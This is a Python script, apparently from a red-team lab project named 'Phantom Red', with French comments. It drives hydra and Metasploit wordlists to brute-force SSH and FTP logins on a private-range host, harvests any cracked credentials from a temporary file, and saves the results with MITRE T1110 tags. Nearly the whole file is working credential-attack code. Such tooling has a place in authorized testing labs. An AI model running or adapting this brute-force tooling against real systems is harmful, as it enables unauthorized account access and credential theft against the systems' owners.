import subprocess
import json
from datetime import datetime

class PhantomBruteforce:
    def __init__(self, target):
        self.target = target
        self.results = []

    def bruteforce_ssh(self):
        print("[🔴 PHANTOM RED] Brute force SSH (T1110)...")
        
        # Wordlist par défaut de Kali
        userlist = "/usr/share/metasploit-framework/data/wordlists/unix_users.txt"
        passlist = "/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt"

        try:
            result = subprocess.run(
                [
                    "hydra",
                    "-L", userlist,
                    "-P", passlist,
                    "-t", "4",
                    "-f",
                    "-o", "/tmp/hydra_results.txt",
                    f"ssh://{self.target}"
                ],
                capture_output=True, text=True, timeout=120
            )
            output = result.stdout + result.stderr
            success = "login:" in output.lower() and "password:" in output.lower()

            # Lire les credentials trouvés
            credentials = []
            try:
                with open("/tmp/hydra_results.txt", "r") as f:
                    for line in f.readlines():
                        if "login:" in line.lower():
                            credentials.append(line.strip())
            except:
                pass

            self.results.append({
                "timestamp": str(datetime.now()),
                "attack": "ssh_bruteforce",
                "target": self.target,
                "port": 22,
                "success": success,
                "credentials": credentials,
                "mitre": "T1110",
                "output": output[:500]
            })

            if success:
                print(f"[✅ PHANTOM RED] Credentials trouvés !")
                for cred in credentials:
                    print(f"  → {cred}")
            else:
                print("[⚠️ PHANTOM RED] Brute force SSH lancé")

        except subprocess.TimeoutExpired:
            print("[⏱️ PHANTOM RED] Timeout brute force SSH")
        except Exception as e:
            print(f"[❌ ERROR] {e}")

    def bruteforce_ftp(self):
        print("[🔴 PHANTOM RED] Brute force FTP (T1110)...")

        try:
            result = subprocess.run(
                [
                    "hydra",
                    "-l", "msfadmin",
                    "-P", "/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt",
                    "-t", "4",
                    "-f",
                    f"ftp://{self.target}"
                ],
                capture_output=True, text=True, timeout=120
            )
            output = result.stdout + result.stderr
            success = "login:" in output.lower() and "password:" in output.lower()

            self.results.append({
                "timestamp": str(datetime.now()),
                "attack": "ftp_bruteforce",
                "target": self.target,
                "port": 21,
                "success": success,
                "mitre": "T1110",
                "output": output[:500]
            })

            if success:
                print("[✅ PHANTOM RED] FTP credentials trouvés !")
            else:
                print("[⚠️ PHANTOM RED] Brute force FTP lancé")

        except subprocess.TimeoutExpired:
            print("[⏱️ PHANTOM RED] Timeout brute force FTP")
        except Exception as e:
            print(f"[❌ ERROR] {e}")

    def save(self):
        filepath = "/home/rym98pwu/phantom/phantom_red/bruteforce_results.json"
        with open(filepath, "w") as f:
            json.dump(self.results, f, indent=4)
        print(f"[📄 PHANTOM RED] Résultats sauvegardés dans bruteforce_results.json")

if __name__ == "__main__":
    bf = PhantomBruteforce("192.168.100.20")
    bf.bruteforce_ssh()
    bf.bruteforce_ftp()
    bf.save()

